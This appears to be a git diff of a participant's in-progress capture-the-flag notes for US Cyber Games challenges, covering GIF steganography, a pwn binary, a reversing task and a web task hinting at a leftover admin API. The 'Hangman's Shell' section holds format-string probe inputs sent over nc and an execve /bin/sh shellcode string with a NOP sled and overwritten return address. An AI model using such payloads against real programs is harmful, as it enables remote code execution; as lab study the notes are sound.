@@ -23,9 +23,14 @@ URL encode the a malicious code to curl the localhost to get to `/shutdown`
 ## I Want to Believe [Forensics] - TODO
 - gift.gif
 - possible lead? seems to have a white flash frame in the gif
-ffmpeg -i input/gift.gif -fps_mode 0 temp/temp%d.png
 
-steghide extract -sf ./gift.gif -p ""
+- stegsolve.jar (helps with analyzing frames, possible some on frame 5 on the bottom right)
+- there are hidden items on frame5, but hidden files as a full gift.gif
+
+`zsteg frame2.bmp ` with a `-a` I believe, and also strings for the gift. There's a a weird NETSCAPE2 in there 
+
+
+
 
 ## Hunt [web]
 
@@ -698,7 +703,7 @@ https://ctfd.uscybergames.com/files/b694602c1b73e94e94d82977a9acbed9/intercepted
 
 
 
-## Hangman's Shell [Pwn]
+## Hangman's Shell [Pwn] TODO 
 
 
 ### Task
@@ -712,7 +717,60 @@ https://ctfd.uscybergames.com/files/2d69e3d47704f268e77df6813aa3c090/hangman.c
 ```
 
 
+possible payloads
+```
+$ nc 167.99.118.184 31339
+***IMPORTANT***
+This program is still a shell, code is still in development
+A full game of hangman is unavailable at this time
+
+Welcome to hangman v0.1!
+Select game mode (1, 2, or 3): 2
+Please enter a word: %x %x %x %x %x %s
+
+
+
+$ nc 167.99.118.184 31339
+***IMPORTANT***
+This program is still a shell, code is still in development
+A full game of hangman is unavailable at this time
+
+Welcome to hangman v0.1!
+Select game mode (1, 2, or 3): 2
+Please enter a word: %x %x %x %x %x %x %x %x %s
+
+```
+
+
+gdb ./hangman
+break *0x000055555555530b
+run 
+continue
+`\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H1\xd2H1\xc0PH\xbb/bin//shSH\x89\xe7PWH\x89\xe6\xb0;\x0f\x05AABBBBBBBB\x90\xdc\xff\xff\xff\x7f`
+
+nexti
+x/64x $rsp
+
+
+^^
+
+
 ### My Solve
+
+
+- run x64dbg on kali (long install) 
+  ```
+    git clone --recursive https://github.com/x64dbg/x64dbg.git
+
+    cd x64dbg
+    mkdir build
+    cd build
+    cmake ..
+    make -j$(nproc)
+
+
+    ```
+- run with : `./release/x64dbg`
 
 
 
@@ -909,3 +967,26 @@ print("Flag:", flag)
 
 - the right side has all the hexes for the flag_check array that we need to run `x80 - x` through to get the final characters
 ![alt text](mathReversal.png)
+
+
+## Touch-Grass [Web]
+
+```
+150
+ARIA has ordered you to touch grass. Now you actually have to do it. Make up for all the times you havent touched it.
+
+https://uscybercombine-touch-grass.chals.io/
+
+```
+
+- find the api endpoint that gives you touch? 
+```
+<h4 style="color:red">!Important!</h4>
+        <p>The following is your grass touch counter. You need over 100000 to successfully make up for the times you havent touched grass.</p>
+        <h4>Touch Count: 0</h4>
+        <!-- Put clickable image of grass here. Need javascript to send POST when clicked-->
+        <!-- New click API at /api/click, remove the admin version ASAP -->
+      </div>
+    </body>
+```
+
